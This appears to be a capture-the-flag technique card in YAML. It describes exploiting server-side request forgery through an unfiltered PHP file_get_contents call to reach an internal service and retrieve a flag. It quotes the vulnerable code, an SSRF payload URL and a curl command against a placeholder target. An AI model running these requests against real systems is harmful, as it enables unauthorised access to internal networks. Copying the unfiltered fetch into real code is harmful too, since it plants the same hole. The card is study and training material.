name: php_ssrf_internal_service
category: web
tags: [ssrf, php, file_get_contents, internal_service]
indicators:
  - "PHP uses file_get_contents to fetch user URL"
  - "Internal service only accessible from internal network"
  - "Hint: access internal service"
  - "URL parameter has no filtering"

tricks:
  - name: "Step 1: Identify SSRF vulnerability"
    when: "Analyze source code"
    how: "redirect.php uses file_get_contents($url) without filtering"
    payload: |
      $url = $_GET['url'];
      $response = file_get_contents($url);

  - name: "Step 2: Discover internal service"
    when: "Check page hints"
    how: "Page reveals internal service address"
    payload: |
      Additional information is available internally at http://internal-service

  - name: "Step 3: Execute SSRF"
    when: "Need to access internal service"
    how: "Use redirect.php url parameter to access internal service"
    payload: |
      /redirect.php?url=http://internal-service

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "GET request to redirect.php with internal service URL"
    payload: |
      curl "http://TARGET/redirect.php?url=http://internal-service"
